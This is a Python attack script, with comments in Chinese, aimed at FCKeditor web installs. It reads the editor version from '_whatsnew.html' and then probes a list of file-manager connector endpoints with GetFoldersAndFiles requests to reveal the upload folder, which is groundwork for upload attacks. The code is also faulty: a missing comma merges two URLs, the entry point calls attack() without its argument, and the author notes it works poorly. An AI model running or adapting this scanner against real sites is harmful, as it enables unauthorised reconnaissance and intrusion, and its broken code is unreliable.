# -*- coding: utf-8 -*-

from bs4 import BeautifulSoup
import requests
import re

'''
Usage:
    moon.py -u  fck http://127.0.0.1:8080     #此脚本需更新，效果较差
    
'''

def attack(URL):
    #获取fck版本
    user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
    headers={"User-Agent":user_agent}
    url = URL + '/_whatsnew.html'
    try:
        verify_response = requests.get(url, headers=headers)
        html = verify_response.content
        soup = BeautifulSoup(html, "lxml")
        print("[+]此Fckeditor版本为："+soup.h3.string.strip())

    except :
        print("[-]获取Fckeditor版本错误！!")

    #获取fck文件上传路径,这里针对高版本有问题。得推倒从来
    urls = (
        '/editor/filemanager/browser/default/connectors/asp/connector.asp?Command=GetFoldersAndFiles&Type=Image&CurrentFolder=/',
        '/editor/filemanager/browser/default/connectors/aspx/connector.aspx?Command=GetFoldersAndFiles&Type=Image&CurrentFolder=/',
        '/editor/filemanager/browser/default/connectors/cfm/connector.cfm?Command=GetFoldersAndFiles&Type=Image&CurrentFolder=/',
        '/editor/filemanager/browser/default/connectors/lasso/connector.lasso?Command=GetFoldersAndFiles&Type=Image&CurrentFolder=/',
        '/editor/filemanager/browser/default/connectors/php/connector.php?Command=GetFoldersAndFiles&Type=Image&CurrentFolder=/',
        '/editor/filemanager/browser/default/connectors/jsp/connector.jsp?Command=GetFoldersAndFiles&Type=Image&CurrentFolder=/',
        '/editor/filemanager/connectors/asp/connector.asp?Command=GetFoldersAndFiles&Type=Image&CurrentFolder=/',
        '/editor/filemanager/connectors/aspx/connector.aspx?Command=GetFoldersAndFiles&Type=Image&CurrentFolder=/',
        '/editor/filemanager/connectors/cfm/connector.cfm?Command=GetFoldersAndFiles&Type=Image&CurrentFolder=/',
        '/editor/filemanager/connectors/lasso/connector.lasso?Command=GetFoldersAndFiles&Type=Image&CurrentFolder=/',
        '/editor/filemanager/connectors/php/connector.php?Command=GetFoldersAndFiles&Type=Image&CurrentFolder=/',
        '/editor/filemanager/connectors/jsp/connector.jsp?Command=GetFoldersAndFiles&Type=Image&CurrentFolder=/'
        '/FCKeditor/editor/filemanager/connectors/asp/connector.asp?Command=GetFoldersAndFiles&Type=File&CurrentFolder=%2F',
        '/FCKeditor/editor/filemanager/connectors/jsp/connector.jsp?Command=GetFoldersAndFiles&Type=File&CurrentFolder=%2F',
        '/FCKeditor/editor/filemanager/connectors/php/connector.php?Command=GetFoldersAndFiles&Type=File&CurrentFolder=%2F'
    )
    try:
        for url in urls:
            url = URL + url

            verify_response = requests.get(url, headers=headers)
            html = verify_response.content.decode('utf-8')
            soup = re.search(r'<CurrentFolder (.*?) />', html)
            print("[+]此Fckeditor上传路径为：" + soup.group())
            break
    except:
        print('[-]获取此Fckeditor上传路径错误')

    #print('[+]获取文件上传目录2.5  2.6：'+URL+'/editor/filemanager/connectors/asp/connector.asp?Command=GetFoldersAndFiles&Type=File&CurrentFolder=%2F')



if __name__ == "__main__":
    attack()

